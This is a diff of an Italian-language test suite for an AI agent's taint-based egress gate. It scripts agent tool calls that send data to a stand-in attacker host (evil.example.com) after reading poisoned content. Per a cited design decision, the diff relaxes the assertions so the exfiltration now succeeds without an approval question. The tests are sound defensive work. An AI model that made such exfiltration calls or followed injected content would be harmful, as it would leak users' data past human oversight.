@@ -192,20 +192,21 @@ describe('una decisione non dipende da come è impacchettato il contenuto', () =
     const pulito = await scena(INNOCUO, script, 'allow');
     const sporco = await scena(AVVELENATO, [...script], 'allow');
 
-    // Il fatto misurato: i byte non escono, e l'owner non viene messo nella
-    // posizione di approvarli. Vale identico nei due casi, perché la decisione
-    // guarda il **taint**, non il testo.
-    expect(pulito.usciti).toEqual([]);
-    expect(sporco.usciti).toEqual([]);
+    // ADR-0065: `sys.http` è `url-read`, aperta per costruzione — il fatto
+    // misurato non è più "i byte non escono", è "escono ugualmente nei due
+    // casi", perché la decisione guarda il **taint**, non il testo. `EXFIL`
+    // porta una query (`?x=1`) e `DISK_TIER` (2) non supera `paramsMaxTaint`
+    // (2, `POLICY_FLOOR`): il gate sui parametri non scatta, in nessuno dei
+    // due file.
+    expect(pulito.usciti).toEqual([EXFIL]);
+    expect(sporco.usciti).toEqual([EXFIL]);
     expect(pulito.domande).toEqual([]);
     expect(sporco.domande).toEqual([]);
-    // Zero byte usciti **e** zero domande è la firma osservabile di un `deny`:
-    // un `ask` avrebbe lasciato una riga in `domande`, e un `allow` una in
-    // `usciti`. Nessuna delle due, quindi il kernel ha rifiutato da solo — che
-    // è la decisione, letta dai suoi effetti invece che dalla sua prosa.
-    // E il tier che la lettura dichiara è quello di sempre, in tutti e due.
-    expect(pulito.tier).toEqual([DISK_TIER]);
-    expect(sporco.tier).toEqual([DISK_TIER]);
+    // E il tier che la lettura dichiara è quello di sempre, in tutti e due —
+    // seguito ora dal tier 3 della fetch, che prima di questa fetta non veniva
+    // mai dichiarato perché il kernel rifiutava prima che il tool girasse.
+    expect(pulito.tier).toEqual([DISK_TIER, 3]);
+    expect(sporco.tier).toEqual([DISK_TIER, 3]);
     expect(DISK_TIER).toBe(2);
   });
 
@@ -225,10 +226,10 @@ describe('una decisione non dipende da come è impacchettato il contenuto', () =
 
   it("uscire senza aver letto niente resta raggiungibile — è un gate, non un muro", async () => {
     const solo = await scena(AVVELENATO, [callTool('http_get', { url: EXFIL })], 'allow');
-    // Nessuna lettura, quindi taint 0, quindi l'host fuori allowlist è una
-    // domanda e non un rifiuto: la riga di utility che dice che il recinto non
-    // ha stretto niente per sbaglio.
-    expect(solo.domande).toEqual(['egress fuori allowlist: evil.example.com']);
+    // Nessuna lettura, quindi taint 0: sotto `paramsMaxTaint` esattamente come
+    // nel test sopra, quindi nessuna domanda anche qui — la riga di utility
+    // che dice che il recinto non ha stretto niente per sbaglio.
+    expect(solo.domande).toEqual([]);
     expect(solo.usciti).toEqual([EXFIL]);
   });
 
